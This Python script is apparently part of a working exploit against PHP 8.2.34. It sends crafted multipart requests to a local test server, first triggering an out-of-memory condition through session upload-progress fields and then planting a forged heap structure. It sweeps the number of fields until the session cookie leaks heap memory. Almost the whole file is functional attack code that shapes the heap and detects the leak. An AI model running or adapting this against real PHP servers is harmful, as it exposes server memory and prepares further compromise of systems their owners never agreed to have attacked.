"""8.2.34 stage-1 calibration: sweep n (v-field count) to find when the forge
field lands on PS(id).len (ID becomes 'too long') -> leak fires.

For each n, check:
  - cookie length (leak signal: >100B means heap dump)
  - error message ('too long' = forge landed; 'Failed to create session data file' = not)
"""
import sys, os, time, struct, re
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18111/"

def trial(n, vlen=48):
    t = E.Target(URL, timeout=90.0, verbose=False)
    # Request 1: OOM trigger
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    try:
        t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception:
        pass
    time.sleep(0.3)
    # Request 2: leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * (vlen - 4))[:vlen]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    except Exception:
        r2 = b""
    raw = E.parse_cookie(r2)
    body = r2.partition(b"\r\n\r\n")[2]
    too_long = b"too long" in body or b"illegal characters" in body
    path_fail = b"Failed to create session data file" in body
    leak = len(raw) > 100
    tag = " *** LEAK ***" if leak else (" [too long]" if too_long else "")
    print(f"n={n}: cookie={len(raw)}B path_fail={path_fail}{tag}", flush=True)
    return leak, len(raw)

print("=== 8.2.34 stage-1 n-sweep ===", flush=True)
found = None
for n in range(800, 961, 5):
    leak, clen = trial(n)
    if leak:
        found = n
        print(f"\n*** LEAK at n={n} (cookie={clen}B) ***", flush=True)
        break
    time.sleep(0.2)
if not found:
    print("=== no leak in 800-960 range ===", flush=True)
